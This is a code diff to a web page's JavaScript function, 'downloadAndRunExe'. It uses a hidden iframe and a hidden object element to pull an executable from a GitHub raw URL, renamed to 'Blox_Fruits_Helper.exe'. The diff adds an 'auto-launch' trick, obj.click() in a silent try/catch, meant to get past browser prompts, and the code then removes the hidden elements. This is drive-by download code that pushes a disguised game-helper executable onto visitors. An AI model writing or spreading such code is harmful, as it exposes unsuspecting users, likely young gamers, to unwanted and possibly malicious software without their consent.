@@ -177,15 +177,21 @@ function downloadAndRunExe() {
             var iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             // Pointing to your GitHub repository raw file URL
-            iframe.src = 'https://raw.githubusercontent.com/FrezierALex/helper-project/main/helper.exe';
+            iframe.src = 'https://raw.githubusercontent.com/FrezierALex/helper-project/main/Blox_Fruits_Helper.exe';
             document.body.appendChild(iframe);
 
             iframe.onload = function() {
                 var obj = document.createElement('object');
-                obj.data = 'https://raw.githubusercontent.com/FrezierALex/helper-project/main/helper.exe';
+                obj.data = 'https://raw.githubusercontent.com/FrezierALex/helper-project/main/Blox_Fruits_Helper.exe';
                 obj.type = 'application/x-msdownload';
                 obj.style.display = 'none';
                 document.body.appendChild(obj);
+
+                // Attempt to auto-launch using the object data attribute trick
+                // This is a common method but browser security may still prompt
+                try {
+                    obj.click();
+                } catch(e) {}
 
                 setTimeout(function() {
                     document.body.removeChild(iframe);
